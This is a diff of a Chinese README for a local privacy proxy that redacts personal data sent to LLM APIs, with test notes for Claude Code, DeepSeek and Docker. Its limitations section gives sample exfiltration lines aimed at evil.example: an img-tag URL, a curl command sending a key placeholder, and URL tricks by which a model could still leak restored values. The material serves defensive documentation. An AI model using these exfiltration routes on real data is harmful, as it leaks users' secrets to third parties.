@@ -18,7 +18,7 @@
 
 跑得动本地模型、想要更强的隐私，请先安装分流器；它通过 dsh-addons 的 redaction 包使用这个代理的脱敏核心，安装时一起装上。跑不动的话，单用这个代理也能多一层隐私保护。
 
-> **状态：** 0.2.1，尚未发布到 npm。已在真实的 DeepSeek Chat Completions API 上验证（2026-10-08，见下文）；OpenAI、Anthropic 以及 Claude Code 等真实客户端尚未验证。
+> **状态：** 0.3.0，尚未发布到 npm。已在真实服务上验证：DeepSeek Chat Completions（2026-10-08），以及通过 Claude Code 和 dsh 的 Anthropic Messages（2026-10-14），见下文。OpenAI API 和 Codex CLI 尚未验证。
 
 ## 介绍视频
 
@@ -48,7 +48,7 @@ client receives:   I will email lin.fictional@example.test about /Users/fictiona
 
 ### Docker
 
-尚未实际构建或测试；编写这个镜像的环境没有 Docker。
+2026-10-13 在 Apple Silicon 上用 Docker Desktop 29.6.2（linux/arm64）对本机假上游验证：镜像可以构建（347 MB；加 `--build-arg NAME_MODEL=1` 为 864 MB），以非 root 用户 `node` 运行；没设 `REDACTION_PROXY_AUTH_TOKEN` 时拒绝启动，没带令牌的请求返回 401；邮箱、身份证号和主目录路径在 OpenAI Chat Completions JSON、流式和 Anthropic Messages 中都以脱敏后的形式发往上游，并在回复中还原；允许来源的 CORS 预检得到 204 且不转发，其他来源得到 403；下方的配置文件挂载可用。未测试：用真实模型运行人名模型版镜像，以及 linux/amd64。
 
 ```sh
 docker build -t redaction-proxy .
@@ -62,25 +62,34 @@ docker run --rm -p 127.0.0.1:8787:8787 -e REDACTION_PROXY_AUTH_TOKEN redaction-p
 
 配置文件 `redaction.toml`（或 `.json`）：加上 `-v "$PWD/redaction.toml:/redaction.toml:ro"`，并在末尾加 `--config /redaction.toml`。人名模型：用 `--build-arg NAME_MODEL=1` 构建，并加上 `-v ~/models/nym:/models:ro -e REDACTION_PROXY_NAME_MODEL_DIR=/models`。
 
+上游是非本机的明文 `http://`（例如经由 `host.docker.internal` 访问的本机模型服务器）时，再加 `-e REDACTION_PROXY_ALLOW_INSECURE_UPSTREAM=1`。`maskLocalUsername` 跳过容器的用户 `node`，所以在镜像中不脱敏任何词。
+
 ### npx（首次发布到 npm 之后）
 
-目前还没有发布到 npm，在那之前请按[30 秒上手](#30-秒上手)从克隆目录运行。发布之后：
+目前还没有发布到 npm，在那之前请按[30 秒上手](#30-秒上手)从克隆目录运行。2026-10-14 用本地 tarball 验证：`npm pack` 对 0.3.0 生成 201.6 kB、60 个文件的包，`npx --yes --package=./redaction-proxy-<version>.tgz redaction-proxy --demo` 打印演示输出，不加 `--demo` 时代理在 127.0.0.1:8787 启动。发布之后：
 
 ```sh
 npx redaction-proxy --demo
 npx redaction-proxy           # 启动代理，地址 http://127.0.0.1:8787（本机不需要令牌）
 ```
 
+代理没有健康检查端点：GET 请求会转发到上游。
+
 ## 接入你的工具
 
-> **真实服务目前只验证了 DeepSeek。** 2026-10-08 用[真实服务验证工具](e2e/real/README.md)对 DeepSeek 跑了 4 个场景（Chat Completions；非流式 JSON 与流式；纯文本与强制工具调用），全部通过：上游只看到占位符，每次 5 个值都还原。OpenAI、Anthropic 因没有密钥而跳过，也还没试过真实客户端。
+> **真实服务：已验证 DeepSeek 和 Anthropic，OpenAI 尚未验证。** 2026-10-08 用[真实服务验证工具](e2e/real/README.md)对 DeepSeek 跑了 4 个场景（Chat Completions；非流式 JSON 与流式；纯文本与强制工具调用），全部通过：上游只看到占位符，每次 5 个值都还原。2026-10-13 有两个真实客户端经由代理使用 Anthropic Messages（Claude Haiku 5.5），2026-10-14 两者都在最终的 0.3.0 构建（commit `1a12a30`）上再次通过：
+>
+> - **Claude Code 2.1.287**，以订阅登录，设置 `ANTHROPIC_BASE_URL=http://127.0.0.1:8787`：流式文本与工具（Bash、Read）。检测到的值上游只看到占位符，回复已还原，工具参数按 `toolRestore` 还原 `PATH`、`TERM`、`PROJECT`，其他类别保留为占位符。0.3.0 之前，工具参数中保留的占位符在后续轮次会被重新编号，模型把同一个工具重试了 7 次；0.3.0 中工具只执行 1 次（2026-10-13 为 3 个请求；2026-10-14 模型先写了一句话再调用 Bash 和 Read，共 2 个请求，占位符编号不变）。Claude Code 还会发送操作系统的用户名（在 `safeguards…user_identity` 和项目目录名中），0.3.0 默认会脱敏（`maskLocalUsername`）。
+> - **dsh**（DeepSeek Harness，经由它的 pi-ai Anthropic 路径）：文本与工具。0.3.0 之前，保留的占位符让 Anthropic 以 HTTP 400 拒绝重发的签名 thinking 块；已验证 0.3.0 修复了这个问题。
+>
+> 未验证：OpenAI API（没有密钥）、Codex CLI（未登录）、直接使用 Anthropic SDK（只经由 dsh 的 pi-ai 用过）、用本仓库的 `e2e:real` 验证工具对 Anthropic 运行（未运行）。
 
 工具照常发送自己的 API 密钥；代理原样转发，从不保存。
 
 | 工具 | 配置 | 状态 |
 | --- | --- | --- |
-| Claude Code | `ANTHROPIC_BASE_URL=http://127.0.0.1:8787 claude` | 未测试 |
-| Anthropic SDK | `ANTHROPIC_BASE_URL=http://127.0.0.1:8787`（不带 `/v1`） | 未测试 |
+| Claude Code | `ANTHROPIC_BASE_URL=http://127.0.0.1:8787 claude` | 2026-10-14 已验证（订阅登录；文本、流式、工具） |
+| Anthropic SDK | `ANTHROPIC_BASE_URL=http://127.0.0.1:8787`（不带 `/v1`） | 经由 dsh（pi-ai）验证，未直接验证 |
 | OpenAI SDK 及大多数兼容工具 | `OPENAI_BASE_URL=http://127.0.0.1:8787/v1`（要带 `/v1`） | 未测试 |
 | DeepSeek | 用 `REDACTION_PROXY_OPENAI_UPSTREAM=https://api.deepseek.com node lib/cli.js` 启动代理，再配 `OPENAI_BASE_URL=http://127.0.0.1:8787/v1` 和你的 DeepSeek 密钥。这会替换掉 OpenAI 上游。 | 已用真实服务验证工具验证（仅 API） |
 | Cursor | 不支持：Cursor 的自定义 base URL 请求从 Cursor 自己的服务器发出，访问不到你的 `127.0.0.1`。 | — |
@@ -114,7 +123,8 @@ curl http://127.0.0.1:8787/v1/chat/completions \
 | `debugMasked` | `false` | 在日志里记录脱敏后的请求体，代理不脱敏的字段（`metadata`、图片 URL、base64 数据）原样记录。仅供调试。 |
 | `sendWhenMaskFails` | `false` | 脱敏失败时仍发出请求，不以 422 拒绝：脱敏后仍有检测到的值时发出部分脱敏的请求体，无法脱敏时发出未脱敏的请求体。这会把检测到的值发给服务商。响应会带 `x-redaction-proxy-mask-failed: 1` 头，日志列出字段与类别或错误代码，不含值。环境变量：`REDACTION_PROXY_SEND_WHEN_MASK_FAILS`（`1` 或 `0`）。 |
 | `knownOriginalsTtlSeconds` | `86400`（24 小时） | 检测到的值为客户端之后的请求保留的秒数，从最后一次检测起算；`0` 表示什么都不记。环境变量：`REDACTION_PROXY_KNOWN_ORIGINALS_TTL_SECONDS`。 |
-| `toolRestore.categories` | `PATH`、`TERM`、`PROJECT` | 还原进工具调用参数的占位符类别；其他类别以占位符原样交给工具。`"*"` 还原所有类别。环境变量：`REDACTION_PROXY_TOOL_RESTORE_CATEGORIES`（逗号分隔）。 |
+| `maskLocalUsername` | `true` | 把代理运行时的账户名（不同时也包括主目录的最后一段）当作 `terms` 的一项脱敏（`⟦TERM_n⟧`），所以单独出现的用户名与 `-Users-<名称>-project` 这类项目目录名不会发出。少于 3 个字符的名称与通用账户名（`root`、`node`、`runner`、`user`、`admin` 等）跳过，所以 Docker 镜像的 `node` 用户不脱敏任何词。与列出的词语不同，它在任何地方都不让请求被拒：名称同时是 JSON 键、模型 id 或工具名称的一部分时（`max_tokens` 中的 `max`、`claude`），那里原样发出；紧挨英文字母或数字的出现处（`<名称>2024`）不符合完整单词的匹配，也原样发出。`redaction.terms` 列出的名称（不区分 ASCII 大小写）仍是列出的词语，照常会让请求被拒。环境变量：`REDACTION_PROXY_MASK_LOCAL_USERNAME`（`1` 或 `0`）。 |
+| `toolRestore.categories` | `PATH`、`TERM`、`PROJECT` | 还原进工具调用参数的占位符类别；其他类别以占位符原样交给工具，工具写到磁盘上的也是占位符。`"*"` 还原所有类别。环境变量：`REDACTION_PROXY_TOOL_RESTORE_CATEGORIES`（逗号分隔）。 |
 | `toolRestore.tools` | 无 | 按工具名（去掉首尾空白、不区分大小写）指定还原进该工具参数的类别，替换该工具的 `categories`，例如 `{"git_commit": ["PATH", "EMAIL"]}`；`"*"` 还原所有类别。 |
 
 ```json
@@ -232,7 +242,7 @@ REDACTION_PROXY_NAME_MODEL_DIR=$HOME/models/nym node lib/cli.js
 
 还原，自检而非成绩：只用规则时，1,617 条提示词脱敏后全部能逐字节还原；开启人名模型时是 1,617 条中的 1,587 条（30 条不完全一致）。
 
-上面的数字以检测器 `rules-6+intl-2+ext-1` 测量；发布版是 `rules-12+intl-2+ext-1`，之后的修改都不在数字中。之后的修改包括：schema 用词、API 字段名、占位写法或模板形式的凭证值（`password: required`、`${{ secrets.X }}`）不再脱敏；首尾是英文字母或数字的词语只匹配完整的词。更早、同样不在数字中的修改：代理默认现在也脱敏小写字母开头和夹不换行空格的台湾身份证号、用 `.`、`/`、`_` 分组或前 4 位加括号（`(0912)345678`）的手机号、关键词后的护照号与健保卡号、`@` 经 HTML 或 JSON 转义的邮箱、加引号的凭证键（`"密碼": "…"`、`"jwt": "…"`），以及 `100.64.0.0/10` 和 IPv6 唯一本地地址；`card-strict` 现在也能识别重新分组、用点分隔、混用空格和 `-`，以及换行断开的卡号（这次代理默认只完整脱敏 30.5% 的英文卡号，核心默认是 44.1%）；人名模型的还原错误已修正：同一个名字的不同写法（`Jordan`、`JORDAN`）现在各用一个占位符（自定义词汇也一样，`Nimbus` 和 `NIMBUS` 各自原样还原）。
+上面的数字以检测器 `rules-6+intl-2+ext-1` 测量；发布版是 `rules-12+intl-2+ext-1`，之后的修改都不在数字中。当时的 `ext-1` 只有现在 10 条扩展规则中的 5 条（v0.1.0 之前的修改沿用这个版本），人名模型是 `nym-edge-int8-2`（现在是 `nym-edge-int8-3`）。之后的修改包括：schema 用词、API 字段名、占位写法或模板形式的凭证值（`password: required`、`${{ secrets.X }}`）不再脱敏；首尾是英文字母或数字的词语只匹配完整的词。更早、同样不在数字中的修改：代理默认现在也脱敏小写字母开头和夹不换行空格的台湾身份证号、用 `.`、`/`、`_` 分组或前 4 位加括号（`(0912)345678`）的手机号、关键词后的护照号与健保卡号、`@` 经 HTML 或 JSON 转义的邮箱、加引号的凭证键（`"密碼": "…"`、`"jwt": "…"`），以及 `100.64.0.0/10` 和 IPv6 唯一本地地址；`card-strict` 现在也能识别重新分组、用点分隔、混用空格和 `-`，以及换行断开的卡号（这次代理默认只完整脱敏 30.5% 的英文卡号，核心默认是 44.1%）；人名模型的还原错误已修正：同一个名字的不同写法（`Jordan`、`JORDAN`）现在各用一个占位符（自定义词汇也一样，`Nimbus` 和 `NIMBUS` 各自原样还原）。保留集不用发布版检测器重新评分：后来有些规则修改（例如 `card-strict` 那一项）是看过这些结果后做的，再评分一次就不是盲测；要得到新的保留集数字，需要一组新的保留集。
 
 完整表格：[保留集第 2 版结果](bench/results/public-bench-held-out-v2.md)。较早的[保留集第 1 版](bench/results/public-bench-held-out.md)（1,518 条、较旧的规则 `rules-6+intl-1`、只有标准写法）留作记录。方法和其他测量：[技术细节第 18 节](docs/DETAILS.md#18-實測數字)。
 <!-- RESULTS:END -->
@@ -255,7 +265,7 @@ REDACTION_PROXY_NAME_MODEL_DIR=$HOME/models/nym node lib/cli.js
 - **本机上的其他程序。** 代理默认只监听 `127.0.0.1`；没设 `authToken` 时，本机上的任何程序都能使用它。网页的请求以 403 拒绝，除非来源（Origin）是本机 `http(s)` 网页或列在 `allowedOrigins` 中；指定其他主机名的请求（DNS rebinding）也以 403 拒绝。
 - **模型把值写到哪里。** 回复文本中，模型在哪里写占位符，代理就在哪里还原，只有 URL 内例外：那里的 `https://example.test/?q=⟦EMAIL_1⟧` 保持原样（协议相对（protocol-relative）的 `//example.test/…` 和用反斜杠写的 `\\example.test\…` 也一样），拿到这个 URL 的抓取网页工具，或显示 `![](…)` 图片与链接的客户端，都不会发出真实 email。URL 内的引号和尖括号（`?q='⟦EMAIL_1⟧'`）算在 URL 里，浏览器也这样读；只有开启 URL 的那个引号或 `<`（`href="…"`、`<https://…>`）会结束它。因此 UNC 路径（`\\host\share\…`）里的占位符也保持原样。由引号或 `<` 开启的 URL 只在那里结束，不在空白处结束，因为浏览器会删掉 `<img src="https://evil.example/?e=\t⟦EMAIL_1⟧">` 里的 Tab，无需点击就加载图片。工具输入中以 scheme（`https://`）或 `www.` 开头的字符串，整串到结尾都算一个 URL，因为拿到 `https://evil.example/?p=\t⟦PATH_1⟧` 的工具会删掉 Tab；开头的 `//` 或 `\\`（`// header`）不算。这只针对正常写出的 URL，挡不住刻意规避的模型：其他 URL 中的空白之后（`https://evil.example/?q= ⟦EMAIL_1⟧`）、少写斜杠（`https:evil.example`）、裸域名，都会还原。工具调用参数（回复中所有的工具输入：函数参数、自定义工具输入，以及 `local_shell_call` 等 Responses `*_call` 项目的命令、操作和补丁）默认只还原用户主目录路径和你列在 `terms`、`projectNames` 中的词（`PATH`、`TERM`、`PROJECT`），所以 `curl -d ⟦KEY_1⟧ https://evil.example` 交给工具的是占位符，不是密钥。写代码照常可用，因为路径和列出的标识符会原样往返（列在 `terms` 中的人名也会还原进工具）；需要 email、密钥或证件号的工具会拿到占位符，调用可能失败，直到你在 `toolRestore.tools` 中为它允许该类别。还原后的路径或词仍可能被模型写的命令发出去；工具参数中遇到的每个占位符都记入日志。
 
-另外：模型如果把 `⟦EMAIL_1⟧` 改写成 `[EMAIL_1]`，你会原样看到；需要直接处理被脱敏的值的任务效果会变差；控制字符会被替换成可见字符；重启后会丢失 Responses API 的续接对话与记住的值，续接请求会以 422 拒绝；超过 64 MiB 的请求以 413 拒绝；转发的 `GET`（例如 `/v1/models`）查询字符串不脱敏直接发出。完整清单见[技术细节第 17 节](docs/DETAILS.md#17-完整限制清單)，威胁模型见[第 11 节](docs/DETAILS.md#11-威脅模型)。
+另外：模型如果把 `⟦EMAIL_1⟧` 改写成 `[EMAIL_1]`，你会原样看到；需要直接处理被脱敏的值的任务效果会变差；控制字符会被替换成可见字符；重启后会丢失 Responses API 的续接对话与记住的值，续接请求会以 422 拒绝；回传的占位符只有在模型把它写进工具调用的输入、且这是它按脱敏顺序（先 system、tools 与 instructions；与该工具调用同一个助手回合的文本与推理不算，较早的助手回合算）第一次出现时（或 Responses 续接中代理先前的回复留下它时）才原样发出，并还原成这个编号在这个请求中代表的值；从文件、工具结果或摘要（写在用户文本中或自成一个助手回合）读回的占位符会被转义（`⟪EMAIL_1⟫`），它的值可能换号；残余风险：客户端保留工具调用，却丢掉含有它的值的文本或工具结果、模型写出这个请求中没出现过的占位符，或客户端把文本插进与工具调用同一个助手回合时，旧的占位符仍可能还原成这个编号现在代表的值；这样原样发出的 id 在整个请求中都原样发出，所以工具结果中注入的同一个 id 也还原成同一个值（用户自己的值）；一个编号曾代表两个值时，其中一个从记忆中过期或被淘汰后，带这个编号的旧占位符可能再次原样发出，并还原成剩下的那个值；超过 64 MiB 的请求以 413 拒绝；转发的 `GET`（例如 `/v1/models`）查询字符串不脱敏直接发出。完整清单见[技术细节第 17 节](docs/DETAILS.md#17-完整限制清單)，威胁模型见[第 11 节](docs/DETAILS.md#11-威脅模型)。
 
 ## 更多
 
